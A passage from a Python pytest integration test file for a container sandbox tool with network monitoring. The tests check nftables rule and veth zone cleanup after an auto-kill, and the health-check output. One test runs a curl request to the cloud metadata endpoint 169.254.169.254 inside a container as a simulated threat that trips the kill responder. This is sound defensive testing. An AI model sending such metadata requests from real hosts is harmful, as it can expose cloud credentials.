            # backstop once the attach returns (the container is already gone) —
            # the latter was previously skipped, which is what made this flaky.
            # Either path clears the rules; under CI load it can still lag the
            # kill, so poll generously.
            cleaned = False
            for _ in range(60):
                if not check_nft_coi_rules_exist(container_ip):
                    cleaned = True
                    break
                time.sleep(1)

            assert cleaned, (
                f"nft rules in ip coi forward should be cleaned up for "
                f"{container_ip} after auto-kill"
            )

        finally:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
            cleanup_container(container_name, coi_binary, env=coi_monitoring_env)


def get_container_veth_name(container_name):
    """Get the veth interface name for a container using JSON format."""
    result = subprocess.run(
        ["incus", "list", container_name, "--format=json"],
        capture_output=True,
        text=True,
        timeout=10,
    )
    if result.returncode != 0:
        return None

    try:
        containers = json.loads(result.stdout)
        if not containers:
            return None

        # Look for eth0's host_name in the network state
        network = containers[0].get("state", {}).get("network", {})
        eth0 = network.get("eth0", {})
        return eth0.get("host_name")
    except (json.JSONDecodeError, IndexError, KeyError):
        return None


def check_veth_in_firewalld_zone(veth_name):
    """Check if veth interface is registered in any nft zone/policy table."""
    if not veth_name:
        return False

    # Check the nft ruleset for the veth name (covers both firewalld-managed and
    # nftables-native zone tables)
    result = subprocess.run(
        ["sudo", "-n", "nft", "list", "ruleset"],
        capture_output=True,
        text=True,
        timeout=10,
    )
    if result.returncode != 0:
        return False

    return veth_name in result.stdout


class TestVethZoneCleanupOnAutoKill:
    """Test veth zone binding cleanup when containers are auto-killed by responder."""

    @pytest.fixture(autouse=True)
    def check_nft_available(self, nft_monitoring_available):
        """Ensure NFT monitoring is available before running tests."""
        pass

    def test_veth_zone_binding_cleaned_on_auto_kill(
        self, test_workspace, coi_binary, coi_monitoring_env
    ):
        """Verify veth zone binding is removed when container is auto-killed by responder."""
        slot = 64
        container_name = get_container_name_from_workspace(test_workspace, slot)

        # Add restricted network to config (needed for veth zone bindings)
        import pathlib

        config_path = pathlib.Path(test_workspace) / ".coi" / "config.toml"
        config_text = config_path.read_text()
        if "[network]" not in config_text:
            config_path.write_text(config_text + '\n[network]\nmode = "restricted"\n')

        # Start session with monitoring (via config) AND restricted network (to have veth zone bindings)
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                str(slot),
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=coi_monitoring_env,
        )

        try:
            if not wait_for_container_ready(container_name, timeout=60):
                pytest.fail(f"Container {container_name} did not start")

            # Get container IP and verify NFT rules are set up before proceeding
            container_ip = wait_for_container_ip(container_name)
            assert container_ip, f"Container {container_name} got no IP address"

            # Wait for NFT rules to be created (critical for this test)
            nft_ready = False
            for _ in range(10):
                if check_nft_rules_exist(container_ip):
                    nft_ready = True
                    break
                time.sleep(1)

            assert nft_ready, f"NFT monitoring rules never appeared for {container_ip}"

            # Get veth name BEFORE killing (needed for cleanup verification)
            veth_name = get_container_veth_name(container_name)
            assert veth_name, f"Could not get the veth name for {container_name}"

            # Note: We don't skip if veth isn't in zone - the cleanup should still run
            # and the test verifies the end state (veth not in any zone after cleanup)

            # Trigger auto-kill by accessing metadata endpoint (CRITICAL threat)
            subprocess.run(
                [
                    "incus",
                    "exec",
                    container_name,
                    "--",
                    "curl",
                    "-m",
                    "3",
                    "http://169.254.169.254/",
                ],
                capture_output=True,
                timeout=10,
            )

            # Wait for responder to detect threat and kill container
            # Use retry loop since this test runs early and may need more time
            killed = False
            for _ in range(15):
                time.sleep(1)
                state = get_container_state(container_name)
                if state in ("Stopped", "Unknown"):
                    killed = True
                    break

            # Debug output if not killed
            if not killed:
                events = get_nft_threat_events(container_name)
                print("\n=== DEBUG: Veth test - Container not killed ===")
                print(f"State: {state}")
                print(f"NFT events: {len(events)}")
                for e in events:
                    print(f"  - {e.get('level')}: {e.get('title')}")
                print("=== END DEBUG ===\n")

            assert killed, f"Container should have been killed but state is {state}"

            # Verify veth zone binding is cleaned up. Cleanup can lag slightly
            # behind the container reaching Stopped, so poll rather than checking
            # once immediately after the kill.
            cleaned = False
            for _ in range(15):
                if not check_veth_in_firewalld_zone(veth_name):
                    cleaned = True
                    break
                time.sleep(1)
            assert cleaned, (
                f"Veth zone binding should be cleaned up for {veth_name} after auto-kill"
            )

        finally:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
            cleanup_container(container_name, coi_binary, env=coi_monitoring_env)


class TestHealthChecks:
    """Test NFT monitoring health checks."""

    def test_health_command_runs(self, coi_binary, coi_monitoring_env):
        """Test that health command runs successfully."""
        result = subprocess.run(
            [coi_binary, "health", "--verbose"],
            capture_output=True,
            text=True,
            timeout=60,
            env=coi_monitoring_env,
        )
        # Health may return 1 (DEGRADED) with warnings - that's acceptable
        # Accept 0 (healthy), 1 (degraded), or 2 (unhealthy) — these tests verify
        # health output content, not that the CI runner's system is fully healthy.
        assert result.returncode in (0, 1, 2), f"Health check crashed: {result.stderr}"
        output_lower = result.stdout.lower()
        assert "checks passed" in output_lower or "checks failed" in output_lower, (
            f"Expected health check summary in output:\n{result.stdout}"
        )

    def test_health_includes_monitoring_check(self, coi_binary, coi_monitoring_env):
        """Test that health includes monitoring-related checks."""
        result = subprocess.run(
            [coi_binary, "health", "--verbose"],
            capture_output=True,
            text=True,
            timeout=60,
            env=coi_monitoring_env,
        )
        # Accept 0 (healthy), 1 (degraded), or 2 (unhealthy) — these tests verify
        # health output content, not that the CI runner's system is fully healthy.
        assert result.returncode in (0, 1, 2), f"Health check crashed: {result.stderr}"
        output_lower = result.stdout.lower()
        assert "monitoring" in output_lower or "process" in output_lower, (
            f"No monitoring checks found in health output:\n{result.stdout}"
        )

    def test_health_includes_network_check(self, coi_binary, coi_monitoring_env):
        """Test that health includes network-related checks."""
        result = subprocess.run(
            [coi_binary, "health", "--verbose"],
            capture_output=True,
            text=True,
            timeout=60,
            env=coi_monitoring_env,
        )
        # Accept 0 (healthy), 1 (degraded), or 2 (unhealthy) — these tests verify
        # health output content, not that the CI runner's system is fully healthy.
        assert result.returncode in (0, 1, 2), f"Health check crashed: {result.stderr}"
        output_lower = result.stdout.lower()
        assert "network" in output_lower, (
            f"No network checks found in health output:\n{result.stdout}"
        )
